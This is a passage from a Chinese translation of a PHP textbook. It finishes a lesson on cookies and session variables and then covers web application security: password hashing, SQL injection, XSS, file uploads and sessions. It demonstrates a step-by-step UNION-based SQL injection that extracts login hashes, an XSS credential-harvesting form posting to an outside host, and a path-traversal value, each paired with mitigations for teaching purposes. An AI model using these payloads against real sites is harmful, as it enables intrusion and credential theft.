elseif (isset($_SESSION['name']) && isset($_SESSION['favorite_cookie']))
{
```

并将 isset() 调用中的 $_COOKIE[] 引用替换为使用 $_SESSION[]。

在此 elseif 子句中，将对 $_COOKIE 的引用替换为使用 $_SESSION 变量，以便输出的短语：

```
    elseif (isset($_SESSION['name']) && isset($_SESSION['favorite_cookie']))
    {
?>
<h4>
Hey <?= $_SESSION['name'] ?>, you like
<?= $_SESSION['favorite_cookie'] ?> cookies. Very nice!
</h4>
```

最后，为了清除响应，用对 session_destroy() 的调用替换删除 cookie 的 setcookie() 调用。然后，删除 $_SESSION[] 超全局变量的内容。参见列表 21.6。

### 列表 21.6.

```php
elseif (isset($_SESSION['name']) && isset($_SESSION['favorite_cookie']))
{
?>
<h4>
Hey <?= $_SESSION['name'] ?>, you like
<?= $_SESSION['favorite_cookie'] ?> cookies. Very nice!
</h4>
<?php
session_destroy(); // End the current session
$_SESSION = []; // Destroy all session variables in the current session
}
```

## 完整的 sessionvariables.php 代码列表

### 列表 21.7.

```php
<?php
session_start(); // Start or resume the current session so we can access session variables
?>
<html>
<head>
<title>Using Session Variables</title>
<link rel="stylesheet"
href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
integrity="sha384-GJzZqFGwbIQTTN6wy59ff1BuGJpLSa9DkKmp0Dg1MDm4iYMj70gZKylYbI706tWS"
crossorigin="anonymous">
</head>
<body>
<div class="card">
<div class="card-body">
<h1>Using Session Variables</h1>
<?php
// User entered name, save name and display form asking for favorite cookie
if (isset($_POST['name_submission']) && isset($_POST['entered_name'])) {
$_SESSION['name'] = $_POST['entered_name'];
?>
<form class="needs-validation" novalidate method="POST"
action="<?= $_SERVER['PHP_SELF'] ?>;">
<div class="form-group">
<label for="name"><h4>what is your favorite
cookie?</h4></label>
<input type="text" class="form-control"
id="entered_cookie" name="entered_cookie"
placeholder="Enter a cookie you like to eat"
required>
</div>
<button type="submit" class="btn btn-primary"
name="cookie_submission">Submit
</button>
</form>
<?php
} // User entered favorite cookie, save session variable and redirect to this page
elseif (isset($_POST['cookie_submission']) && isset($_POST['entered_cookie'])) {
$_SESSION['favorite_cookie'] = $_POST['entered_cookie'];

header("Location: {$_SERVER['PHP_SELF']}");
exit;
}
// Output message displaying saved Session variables
// then end the current session and delete the Session variables
elseif (isset($_SESSION['name']) && isset($_SESSION['favorite_cookie'])) {
?>
<h4>
Hey <?= $_SESSION['name'] ?>, you like
<?= $_SESSION['favorite_cookie'] ?> cookies. Very nice!
</h4>
<?php
session_destroy(); // End the current session
$_SESSION =
[]; // Destroy all session variables in the current session
} // Initial navigation to this page, display form asking for name
else {
?>
<form class="needs-validation" novalidate method="POST"
action="<?= $_SERVER['PHP_SELF'] ?>">
<div class="form-group">
<label for="name"><h4>What is your name?</h4>
</label>
<input type="text" class="form-control"
id="entered_name" name="entered_name"
placeholder="Enter your name" required>
</div>
<button type="submit" class="btn btn-primary"
name="name_submission">Submit
</button>
</form>

<?php
}
?>
</div>
</div>
<script>
// JavaScript for disabling form submissions if there are invalid fields
```




```javascript
(function () {
  'use strict';
  window.addEventListener('load', function () {
    // Fetch all the forms we want to apply custom Bootstrap validation styles to
    var forms = document.getElementsByClassName('needs-validation');
    // Loop over them and prevent submission
    var validation = Array.prototype.filter.call(forms, function (form) {
      form.addEventListener('submit', function (event) {
        if (form.checkValidity() === false) {
          event.preventDefault();
          event.stopPropagation();
        }
        form.classList.add('was-validated');
      }, false);
    });
  }, false);
})();
</script>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
  integrity="sha384-q8i/X+965DzO0rT7abK4lJStQIAqVgRVzpbzo5smXK4pYfRvH+8abtTE1Pi6jizo"
  crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
  integrity="sha384-wHAiFfRlMFy6lSRaxvfo0CifBUQy1xHdJ/yoi7FRNXMRBu5MHDZYu1hA6Z0blgut"
  crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
  integrity="sha384-B0UglyR+J6NckvkICOB2joafSI4l3gm9U6GHC10gL6L5j7I6U/nkkadukaBhLAXv9k"
  crossorigin="anonymous"></script>
</body>
</html>
```

## Cookies 与会话变量

Cookies 和会话变量可以共存。一个原因是，Cookies 的持久性可以比会话变量更长。然而，由于 Cookies 存储在浏览器中，它们可能存在安全风险。在使用会话时，一个合理的 Cookie 是会话标识符（ID）。这是因为用户可以在一个应用程序中打开多个标签页。当你调用 `session_start()` 时，会话 ID 会以 Cookie 的形式发送到浏览器，并使用生成的会话名称作为键。你可以通过调用 `session_name()` 函数来获取当前会话的会话名称。当你不再使用某些 Cookies 并准备删除它们时，也需要使用 `session_name()` 函数将会话 Cookie 删除：

```php
if (isset($_COOKIE[session_name()]))
{
    setcookie(session_name(), '', time() - 3600);
}
```

## 数据库

当然，数据库是我们拥有的用于按需持久化数据的最佳工具之一。这里我不需要深入介绍如何使用数据库，因为你已经知道如何操作。因此，请记住，我们的许多持久化问题都可以通过数据库来解决。

## 解决持久性问题的最佳实践

认识到 Cookies 和会话变量最初被创建的原因至关重要。它们的诞生是为了解决 Web 的无状态行为所导致的持久性问题。它们仍然适用于在页面之间短暂保存那些无需永久存储到数据库的小量数据。

Cookie 的问题在于它们存储在浏览器中，因此不安全，或者至少不可信。其次是会话变量，因为它们存储在服务器上，所以更安全。然而，它们只在会话活跃期间存在。因此，对于希望在整个会话期间保留的小数据片段，会话变量是合理的选择。

那么，我们如何解决这样一个问题：退出税务申报应用程序后，再次登录时希望恢复到上次的进度？这种情况下，使用数据库是更优的解决方案。比如，我们可以为每个用户关联一个数据库表，用于标记他们在税务申报流程中所处的位置。

需要注意的一点是，当你使用会话变量时，会在浏览器中创建一个存储会话 ID 的 Cookie。这是必要的，因为用户可能针对同一应用程序打开多个标签页，我们需要一种切实可行的方法将用户的浏览器与会话关联起来。

## 练习

- 1. 创建 `cookies.php`，要求用户输入最喜欢的饼干口味，并将其存储在浏览器中。
- 2. 添加一个字段，询问用户最喜欢的冰淇淋口味，并将其存储在 Cookie 中。在表单下方显示用户的冰淇淋偏好。
- 3. 创建 `sessionvariables.php`，用于存储用户最喜欢的饼干口味。
- 4. 创建一个包含四个季节（春、夏、冬、秋）的选择菜单。要求用户选择他们最喜欢的季节，并将其存储为会话变量，然后显示该选择。

## 第22章 创建安全的Web应用程序

> “复杂性是致命的。它夺走了开发者的活力，使产品难以规划、构建和测试，它带来了安全挑战，并导致最终用户和管理员的挫败感。”
> 
> ——雷·奥兹（Ray Ozzie）

## 22. 创建安全的Web应用程序

既然这是一本关于 Web 开发的书籍，如果不花费篇幅讨论 Web 应用程序安全性，那便是失职。大多数人——无论是否是开发者——都听说过过去大约十年中发生的可怕数据泄露事件。迄今为止最重大的泄露事件之一，是 2017 年 9 月报告的 Equifax 数据泄露事件，数亿条客户信用记录被盗——基本上超过了美国所有成年人的 70%。具有讽刺意味的是，Equifax 泄露事件的根源是 Apache Web 服务器中一个与 Jakarta Struts 框架相关的漏洞，而该漏洞当时并未被修复。然而，还有许多漏洞是可以通过开发者正确保护其 Web 应用程序来预防的。

Web 安全是一个深奥的话题，在这里我只能浅尝辄止。在本章末尾，我列出了一些参考资料，供你更深入地阅读该主题。尽管如此，每位开发者都必须熟悉的一个参考资料是开放Web应用程序安全项目[1]（OWASP）网站。我发现其中最有用的两个资源是 OWASP Top Ten[2] 和 OWASP Cheat Sheet Series[3]。“OWASP Top Ten” 列出了当今 Web 应用程序中存在的十大安全风险，并提供了描述漏洞及如何有效降低风险的有用链接。“OWASP Cheat Sheet Series” 则按主题组织了一系列安全信息。每篇文章解释了相关漏洞，并提供了降低风险的建议。

本章讨论更常见的漏洞、它们的表现方式，以及如何在你的应用程序中降低这些风险。

## 用于身份验证的安全密码保护

此场景是 “OWASP Top Ten” 中第三大应用程序安全风险（ASR）的一个子集。

## SHA-1 并不安全

我曾用一本以使用安全哈希算法 1（SHA-1）保护用户密码为例的书来教授我的 PHP Web 开发课程。不幸的是，自 2005 年以来，SHA-1 已不再被认为是保护数据的安全算法。SHA-1 哈希密码一旦被攻击者获取，就可以在离线状态下利用足够的计算能力进行破解。2017 年，谷歌通过碰撞攻击成功破解了 SHA-1 算法。使用诸如 SHA-1 甚至尚未被破解的 SHA-256 这样的哈希算法来存储密码的糟糕之处在于，攻击者可以快速生成哈希值。结果导致哈希值

> [1] 开放Web应用程序安全项目：https://owasp.org
> [2] OWASP Top Ten：https://owasp.org/www-project-top-ten/
> [3] OWASP Cheat Sheet Series：https://cheatsheetseries.owasp.org

可以从潜在密码的字典中生成，并存储在被称为“彩虹表”的在线数据库中。

让我给你举个例子。假设我有一个 Web 应用程序的账户。我登录时使用的密码是：ilikebananas。我们再假设这个应用程序的开发者使用 SHA-256 来哈希密码。如果我在浏览器中访问网站 https://passwordsgenerator.net/sha256-hash-generator/，并像图 22.1 那样对我的密码生成一个 SHA-256 哈希值，我将得到以下哈希。

```
06855FBBC5079369B8240F7ED71093ED8203994521A715ED96546FA4B4CE31B7
```

## CrackStation 可以破解无盐哈希密码

接下来，如果我们访问网站 https://crackstation.net 并输入相同的哈希值，我就能成功破解该密码。见图 22.2。

该网站维护着一个数据库，用于对未加盐的哈希值进行反向查找，以匹配可能的密码字典。以下是 CrackStation 关于他们如何创建查找表的引述：

> Crackstation 的查找表是通过提取维基百科数据库中的每个词条，并将其与我们能找到的所有密码列表组合而成的。我们还对我们的词表应用了智能词语变形（暴力混合）技术，使其更加有效。对于 MD5 和 SHA1 哈希，我们拥有一个 190GB、包含 150 亿条目的查找表；对于其他哈希，我们拥有一个 19GB、包含 15 亿条目的查找表。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_323_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_323_1.png)




## 22. 创建安全 Web 应用

这就是为什么每个人都告诉你要创建强随机密码并使用像 LastPass 或 1Password 这样的密码生成工具。

让我尝试破解我用密码管理工具 1Password 生成的密码：

```
RbkboCLYoPKisqKFKV2ikXvV
```

这会生成 SHA-256 哈希值为：

```
7931791FBDBB854240378D6AD728A1D2A1EA5DE763315D71BFAF85DEA819AF5B
```

当我前往 CrackStation 尝试破解此哈希时，它失败了，如图 22.3 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_324_0.png)

> 说到 MD5 呢？本节中的所有内容同样适用于另一种被滥用的哈希函数 md5()。许多较旧的关于构建登录系统的 PHP 文章都使用此哈希函数。然而，它极易被破解，因为它旨在快速生成哈希。因此，任何人都不应将 MD5 用于密码。

### 加盐密码

这些彩虹表仅适用于未加盐的哈希值。什么是“盐”，它如何应用于密码哈希？盐是添加的字符串，用于使密码哈希输出唯一。随机生成的盐即使多个用户使用相同密码也能使哈希输出唯一。每个用户必须有唯一的盐才能使此方法生效。

假设我的 Web 应用的两个用户选择了相同的密码：ilikebananas。为了避免此密码最终出现在彩虹表中，我想使用一种密码哈希算法，为这些用户的每人生成唯一的哈希。首先，此算法生成一个随机盐值。然后，当第一个用户注册时，我们会得到类似以下的盐值：

```
saEEWZTmyiIkLQ0U2MLw9e
```

需要注意的一点是，如果密码超过 72 个字符，则会被截断为 72 个字符。另一点是，使用 password_hash() 的当前默认哈希密码长度为 60 个字符。因此，在数据库中存储哈希密码时，将此字段设为 VARCHAR(255)，以便为这些函数中可用的加密算法更新留出空间。

在使用密码对用户进行身份验证时，使用 password_verify()[5] 函数。此函数接受两个参数，第一个是用户输入的密码，第二个是从数据库中检索到的哈希密码。函数返回 true 如果密码验证通过——你已成功验证用户身份。否则返回 false。

```
if (password_verify($password, $salted_hashed_password))
{
    echo "You're Legit!";
}
```

### 防御 SQL 注入

SQL 注入是 Web 应用的首要安全风险，并在“OWASP 十大风险”中被列为首要 ASR。SQL 注入攻击会直接将数据插入 SQL 查询，而不先清理输入。因此，传递给查询的任何数据源都可能成为攻击向量，必须进行适当的转义。然而，就本次讨论而言，我将重点放在表单字段数据作为对我们 Web 应用的攻击向量，以及如何防止它。

### SQL 注入攻击是什么样的

到目前为止我们编写的所有代码都容易受到 SQL 注入攻击。让我们看一个例子，说明这有多糟糕。假设我有一个电子商务应用，其中有一个页面允许用户浏览我正在销售的商品库存，如图 22.4 所示。

如我们所见，如果用户在搜索字段中输入空内容，我们会得到所有库存以三列的 HTML 表格显示。

[5] password_verify(): https://php.net/password_verify

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_326_0.png)

我们可以假设生成此输出的 SQL 查询可能结构如下：

```
SELECT <some fields> FROM <a table> WHERE <search field> LIKE '%<search term>%';
```

由于这是一个 LIKE 查询，% 是通配符。如果我们搜索库存中包含 sir 的任何内容，则会得到图 22.5 中的输出。

为了检测应用是否直接将输入的表单字段数据插入 SQL 查询，我们可以插入一个单引号 (') 来创建格式错误的 SQL 查询，如图 22.6 所示。

此输出有误，表明我们的应用容易受到 SQL 注入攻击。更糟糕的是，我们可以操纵应用使其返回数据库中的信息。让我展示一下如何操作。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_327_0.png)

> > **不要**在任何网站上执行我即将展示的任何操作，除非你已明确受聘并具备对该网站进行渗透测试的资质！

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_327_1.png)

我们需要理解，我们唯一可以控制的查询部分是输入在两个百分号 (%) 之间的内容。我们可以想象执行查询的 PHP 代码可能如下所示：

```
$search_term = isset($_POST['search']) ? $_POST['search'] : '';

$query = "SELECT some_field_1, some_field_2, some_field_3 FROM SomeTable "
    . "WHERE some_field_n LIKE '%$search_term%'";
```

我现在可以操纵查询返回我想要的几乎任何内容。我可以通过在搜索字段中输入以下内容来测试：

```
' ;--
```

展开后，完整的查询可能如下所示：

```
SELECT some_field_1, some_field_2, some_field_3 FROM SomeTable WHERE some_field_n LIKE '%';-- ';
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_328_0.png)

我将尝试以下输入并得到这些结果（图 22.7）。

由于我们现在知道此应用容易受到 SQL 注入攻击，我想弄清楚应用使用的是哪种数据库技术。MySQL 使用 SLEEP() 作为等待指定毫秒数的命令。如果这有效，我就知道数据库技术是 MySQL。

接下来，我在搜索字段中输入以下内容：

```
sir%' AND 0 = SLEEP(2);--
```

此搜索词会给我所有名称中包含“sir”的库存，并且对于每个条目，在渲染表格前等待两秒。由于有三个条目，应该需要六秒钟（确实如此）。我得到的输出如图 22.8 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_328_1.png)

然后返回类似图 22.9 的内容。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_328_2.png)

现在，我知道可以通过搜索字段操纵查询，并且它是一个 MySQL 数据库。那么，让我们看看是否可以在表格底部显示一些虚拟数据。MySQL 有一个名为 DUAL 的虚拟表。使用 SQL 中的 UNION 命令与子查询，我们可以在表格末尾添加三列虚假信息。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_329_0.png)

让我们在搜索字段中输入以下内容：

```
sir%' UNION (SELECT 1, 2, 3 FROM dual);--
```

我们得到图 22.10。

这不再是盲攻击，因为我们可以从数据库中获取信息。

MySQL 有一个名为 information_schema 的数据库，其中包含有关所有数据库及其表的中继信息。information_schema.tables 表包含有关当前数据库中所有表的信息。字段 TABLE_NAME 和 TABLE_SCHEMA 给出了每个表的名称及其所在的数据库。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_329_1.png)

让我们在搜索字段中输入以下内容以从此数据库中获取一些信息：

```
sir%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables);--
```

我们应该得到图 22.11 和图 22.12 所示的输出。这里有很多有趣的信息可以挖掘。然而，我特别感兴趣的是 SQLInjection 数据库中的 Login 表。information_schema 数据库的 columns 表中的 COLUMN_NAME 字段将列出我感兴趣的任何表的全部字段。字段包含在 COLUMN_NAME 字段中。

让我们在搜索字段中输入以下内容以了解 Login 表中有哪些字段：

```
sir%' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'Login');--
```

我们得到这个（图 22.13）。UserName、HashedPassword 和 Access 看起来很有希望！

我现在知道了想要查询的数据库、表和列。让我们看看是否能获取一些用户名和密码！在搜索字段中输入以下内容：

```
sir%' UNION (SELECT UserName, HashedPassword, Access FROM Login);--
```

这给我们图 22.14 中的信息。我特别感兴趣的是具有管理员访问权限的用户，看起来哈希可能没有加盐（糟糕）！事实上，当我通过 https://crackstation.net 运行哈希时，我得到图 22.15（下一页）。

说真的，这非常可怕。平均而言（逐年），20% 到 30% 的网站容易受到 SQL 注入攻击。

> https://edgescan.com 每年都会发布一份漏洞报告，详细说明已发现的漏洞统计数据。以下是他们 2020 年报告的链接[6]。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_330_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_330_1.png)

[6] 2020 report: http://phpa.me/edgescan-2020



## 22. 创建安全 Web 应用

使用 mysql_real_escape_string() 的问题在于它在没有底层 SQL 查询使用该输入的上下文的情况下转义表单字段输入。有时它会失败的原因相当技术性。然而，请查看 http://phpa.me/so-sqli-edgecase 以了解一个导致清理失败的边缘情况。

### 预处理语句

预处理语句是对 SQL 注入的更好防护。缓解 SQL 注入的更稳健方法是使用预处理语句，也称为参数化查询。mysql_real_escape_string() 的问题在于它没有将你的输入与查询本身分离，而是实际上将其插入到查询中。然而，预处理语句会将数据库输入与查询分离，并且不允许你插入 SQL 命令（如子查询）。让我们看看预处理语句以及如何使用它们。

PHP 语言通过 mysqli 扩展提供了两个用于参数化数据库输入的函数：mysqli_prepare() 和 mysqli_stmt_bind_param()。我们可以一起使用这些函数来参数化数据库查询。mysqli_prepare() 用于将 SQL 查询参数化为语句，该语句将使用 mysqli_stmt_bind_param() 函数绑定到输入参数。

清单 22.2 展示了如何使用这些函数。

```php
<?php
$dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
or trigger_error(
'Error connecting to MySQL server for' . DB_NAME,
E_USER_ERROR
);

$search_term = isset($_POST['search']) ? $_POST['search'] : '';

$sql = "SELECT some_field_1, some_field_2, some_field_3 "
. " FROM Sometable WHERE some_field_n LIKE ?";

$stmt = mysqli_prepare($dbc, $sql);

$search_term = '%' . $search_term . '%';

mysqli_stmt_bind_param($stmt, 's', $search_term);
```

> [8] mysqli_prepare(): https://php.net/mysqli_prepare
> [9] mysqli_stmt_bind_param(): https://php.net/mysqli_stmt_bind_param
> [10] mysqli_stmt_bind_param(): https://php.net/mysqli_stmt_bind_param

### 向黑客泄露信息

用安全术语来说，了解你编写的任何应用程序的攻击向量至关重要。这些通常是通过 POST 发送的 cookie、查询参数和表单字段。对于 Web 应用程序而言。另一个需要考虑的问题是我们公开了哪些信息——例如数据库模式或文件系统路径——黑客可以利用这些信息渗透我们的应用程序。这些恰好与攻击向量密切相关。让我们逐一查看这些。

### Cookie

Web 应用程序可以使用 cookie 存储各种信息。然而，它们驻留在客户端浏览器上，因此可以被查看并且容易被修改。我可以花大量时间讨论什么应该存储在 cookie 中，什么不应该存储（例如，你绝不应在 cookie 中存储个人信息）。然而，这个争论是多余的；除了数据库之外，使用会话变量，并且只使用一个 cookie 来存储会话 ID。这样做可以避免使用 cookie 时的大多数问题。请记住，cookie 只是解决 Web 无状态问题的解决方案之一。我们有更好的工具可用于解决持久性问题：数据库和会话变量。

### 查询参数

查询参数在 HTTP GET 请求的 URL 中发送，在 ? 之后：

```
http://example.com?term=elephant&page=3
```

用户或潜在黑客可以看到这一点。查询参数可以用作持久性机制（类似于表单中的隐藏变量）。这种做法会暴露有关应用程序及其运行方式的细节。通常我们只需要发送一个查询参数，它可以是一个 ID，该 ID 映射到数据库表中的主键，在处理 GET 请求后可以在脚本中查询该主键。

```
http://example.com?id=840938
```

由于查询参数是用户提供的数据，在查询中使用时应对其进行参数化，并在 HTML 中显示时进行转义。

### 表单字段

对于试图猜测数据库模式中字段名称的黑客来说，表单字段是信息的金矿。不幸的是，这一直是开发人员的常见做法，使得在盲 SQL 注入攻击中猜测数据库模式的过程变得容易得多。

我住在一个保险公司众多的地区，它们通常对用于表单字段的数据库表中的列名进行混淆有开发要求。这是一个每个开发人员都应遵循的优秀实践。

### 防止跨站脚本攻击

跨站脚本 (XSS) 被列为“OWASP Top Ten”中的第七号 ASR。根据 OWASP：

> XSS 缺陷每当应用程序在未经适当验证或转义的情况下将不可信数据包含在新的网页中，或使用可以创建 HTML 或 JavaScript 的浏览器 API 用用户提供的数据更新现有网页时就会发生。XSS 允许攻击者在受害者的浏览器中执行脚本，从而劫持用户会话、破坏网站或将用户重定向到恶意网站。

听起来很可怕！好吧，所有这些东西都很可怕。针对浏览器的 XSS 攻击有三种向量：反射型 XSS、存储型 XSS 和 DOM XSS：

OWASP 对此的说法如下：

- **Reflected XSS:** 应用程序或 API 将未经验证和未转义的用户输入作为 HTML 输出的一部分包含在内。成功的攻击可能允许攻击者在受害者的浏览器中执行任意 HTML 和 JavaScript。通常，用户需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意钓鱼网站、广告或类似内容。
- **Stored XSS:** 应用程序或 API 存储未清理的用户输入，该输入稍后会被另一用户或管理员查看。存储型 XSS 通常被认为属于高风险或关键风险。
- **DOM XSS:** JavaScript 框架、单页应用程序以及动态将攻击者可控数据包含到页面中的 API 容易受到 DOM XSS 的影响。理想情况下，应用程序不应向不安全的 JavaScript API 发送攻击者可控数据。

我将处理前两种，因为缓解第三种类型的攻击是在 PHP 之外完成的。

## 22. 创建安全 Web 应用

XSS 的工作原理相当复杂，因为涉及的参与者众多。*PHP 应用的安全原则* 由 Eric Mann 所著，是更深入讨论的优秀参考资料。在第 7 章中，Eric 解释了 XSS 及其预防方法。另一个很好的参考资料是 https://excess-xss.com。作者提供了一份全面的教程，其中包含图表，解释 XSS 和缓解策略。

XSS 的核心涉及三个参与者：攻击者、受害者和易受攻击的网站。为了缓解漏洞，我们的代码必须在输出之前对网站的所有输入进行清理，去除 JavaScript 和 HTML 实体。

### 反射型 XSS

让我们以上面编写的用于测试 SQL 注入攻击的应用程序为例，并在网页上添加搜索词的输出，如图 22.16 所示。

即使我们已将搜索词输入参数化到数据库查询中，让我们看看这个 Web 应用程序是否容易受到反射型 XSS 攻击的利用。如果我们能够执行 JavaScript 命令或渲染一些额外的 HTML，就说明它可以被利用。

```
<script>alert('XSS Attack')</script>
```

让我们首先按图 22.17 所示将 `<script>alert('XSS Attack')</script>` 输入到搜索字段中。我们得到图 22.18 所示的结果。糟糕！不幸的是，这表明我们的应用程序容易受到 XSS 攻击。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_336_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_336_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_336_2.png)

让我们再做一个测试，看看是否可以渲染以下 HTML 表单：

```
<h4>Clickbait Login</h4>
<form action=http://iwantyourcredentials.info method=POST>
    Username:
    <input type='text' name='username'><br/>
    Password:
    <input type='password' name='password'><br/>
    <input type='submit' value='Submit'>
</form>
```

当我们在图 22.19 中将 HTML 输入到搜索字段并按下提交时，我们得到图 22.20 中的结果。

如果我填写此表单并提交它（图 22.21），我就会陷入困境！我们允许网络上的任何攻击者在我们的网站上托管表单。在这种情况下，他们可以利用它来窃取我们用户的凭据。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_337_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_337_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_337_2.png)

让我们看一下易受攻击代码的一部分：

```
$search_term = isset($_POST['search']) ? $_POST['search'] : '';
?>
<h2>Stuff you might be interested in as a result of searching for
<span class="text-danger"><?= $search_term ?></span>...</h2>
```

我们没有对搜索字段的输入进行清理，去除 HTML 实体，如 <、>、" 和其他特殊符号。因此，我们允许 HTML 标记和 JavaScript 代码执行。



## 22. 创建安全 Web 应用

幸运的是，解决方案很简单，只需使用函数 `filter_var()`[^13]。由于我们期望搜索词为字符串，可以这样对应用程序进行 XSS 清理：

```
```php
$search_term = isset($_POST['search']) ? $_POST['search'] : '';
$search_term = filter_var($search_term, FILTER_SANITIZE_STRING);
?>
<h2>Stuff you might be interested in as a result of searching for
<span class="text-danger"><?= $search_term?></span>...</h2>
```
```

现在当我们在搜索字段中输入 `<script>alert('XSS Attack')</script>` 时，不再会弹出 alert()，而是得到你在图 22.22 中看到的输出。当我们将表单输入到搜索字段时，也不再会得到登录表单，而是得到图 22.23 中显示的内容。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_338_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_338_1.png)

请注意，如果你接收到的是电子邮件地址作为输入，应使用 `FILTER_SANITIZE_EMAIL`，因为它会删除电子邮件地址中不允许的所有字符。有关清理过滤器列表的更多信息，请参阅 https://php.net/filter.filters.sanitize。

> > 你可能会看到旧文章使用函数 `htmlentities()`[^14] 和 `htmlspecialchars()` 来防御 XSS。虽然它们可能有效，但不能防止目录遍历攻击。此外，默认参数并不能保护你免受所有 XSS 攻击。

## 存储型 XSS

关于存储型 XSS，你应该非常谨慎，并确保对从数据库查询出来并计划在网页上显示的所有内容都运行 `filter_var()` 函数。如果输出发送到 CSV 文件、PDF 文档或其他格式，可能需要以不同的方式转义。

你应该将这种方法与验证和清理进入 Web 应用程序的所有内容相结合。这意味着使用 `filter_var()` 过滤表单或查询参数中的每个输入，然后对这些输入的所有查询也进行参数化。

[13] `filter_var()`: https://php.net/filter_var

[14] `htmlentities()`: https://php.net/htmlentities

## 文件上传

攻击的另一个来源是上传的文件。OWASP 提供了大量关于上传文件风险以及各种缓解策略的详细信息。我的建议始终是遵循 OWASP 的指导。尽管如此，以下是允许安全上传文件时必须考虑的最小事项。

对于本示例，假设我们要求用户使用以下表单上传图像文件：

```
<form method="POST" enctype="multipart/form-data" action="upload.php">
    File: <input type="file" name="picture">
    <input type="submit" value="Submit">
</form>
```

### 验证上传的文件

验证上传文件需要遵循几个步骤。例如，你需要防范目录路径遍历攻击，仅接受通过 POST 上传的文件，检查文件类型并检查文件大小。

### 防范路径遍历攻击

攻击者可以通过将文件名设置为相对路径（例如 ../../../etc/passwd）来尝试从 Web 服务器获取密码或访问本不打算访问的文件。

为了防范此攻击，使用 basename()[15] 函数剥离不需要的字符：

```
$file_name = basename($_FILES['picture']['name']);
```

### 仅接受通过 HTTP POST 上传的文件

作为防止操纵 Web 应用程序处理不应处理的文件的延伸，你应该使用 is_uploaded_file()[16] 函数验证文件是否确实通过 HTTP POST 上传：

```
if (is_uploaded_file($_FILES['picture']['tmp_name']) === true)
{
    // You're good to go!
}
else
{
    // We've got a problem!
}
```

[15] basename(): https://php.net/basename
[16] is_uploaded_file(): https://php.net/is_uploaded_file

## 22. 创建安全 Web 应用

### 检查 MIME 文件类型

我们还希望防止攻击者上传应用程序不感兴趣的文件（例如可执行文件）。与其依赖 $_FILES['picture']['type'] 中包含的文件扩展名，最好使用 finfo_open()[17] 和 finfo_file()[18] 函数来检查实际文件的 MIME 文件类型：

```
$file_info = finfo_open(FILEINFO_MIME_TYPE);
$file_mime_type = finfo_file($file_info, $_FILES['picture']['tmp_name']);
finfo_close($file_info);
```

如果你期望的是图像类型，除了显式验证 MIME 文件类型外，还应使用 getimagesize()[19] 函数，如清单 22.4 所示

### 清单 22.4.

```
if (is_readable($_FILES['picture']['tmp_name']))
{
    $file_size = getimagesize($_FILES['picture']['tmp_name']);
    if (!empty($file_size) && ($file_size[0] !== 0) && ($file_size[1] !== 0))
    {
        // You're good to go!
    }
    else
    {
        // We've got a problem!
    }
}
```

### 检查文件大小

限制上传文件的最大文件大小始终是最佳实践。我们通常通过在表单内设置 name 属性为 max_file_size 的隐藏输入元素来实现。然而，攻击者可以操纵此值。

Web 服务器还有一个名为 upload_max_filesize 的 INI 文件指令，限制浏览器可以上传到服务器的最大文件。

如果文件超过 max_file_size 或 upload_max_filesize（以较小者为准），文件将不会被上传。在这种情况下，$_FILES['picture']['error'] 将设置为 UPLOAD_ERR_FORM_SIZE 通过检查 $_FILES['picture']['size'] 来进一步限制上传文件到应用程序的大小（以字节为单位）：

[17] finfo_open(): https://php.net/finfo_open
[18] finfo_file(): https://php.net/finfo_file
[19] getimagesize(): https://php.net/getimagesize

```
```php
if ($_FILES['picture']['size'] <= 1000000)
{
    // You're good to go!
}
else
{
    // Too big!
}
```
```

## 保护你的会话

我要介绍的最后一个攻击是会话劫持。如果攻击者能够获取你的会话 ID，就可能窃取你的会话。这通常是由于 XSS 或中间人攻击以及未使用加密连接而发生的。

### 使用 HTTP-Only 会话 Cookie

你可以通过确保设置 Web 服务器的 INI 指令 `session.cookie_httponly=On` 来防止会话劫持。这将拒绝 JavaScript 访问会话 Cookie。

另一个需要考虑的 INI 指令是 `session.use_strict_mode=On`。它防止会话模块接受未由会话模块生成的会话 ID，并可防止使用攻击者初始化的会话 ID。

有关保护会话和 INI 设置的更多信息，请参阅 [https://php.net/session.security.ini](https://php.net/session.security.ini)。

### HTTPS 使用加密通信

防止会话被劫持的另一种方法是仅通过加密连接（即 HTTPS）使 Web 应用程序可用。HTTP 协议以明文通信。相比之下，HTTPS 使用传输层安全（TLS）协议对 HTTP 进行加密。过去，浏览器使用其前身安全套接层（SSL）。设置 Web 服务器使用 HTTPS 协议涉及使用包含 Web 服务器私钥和客户端浏览器用于连接到安全服务器的公钥的 TLS/SSL 证书。公钥和私钥处理加密和解密。

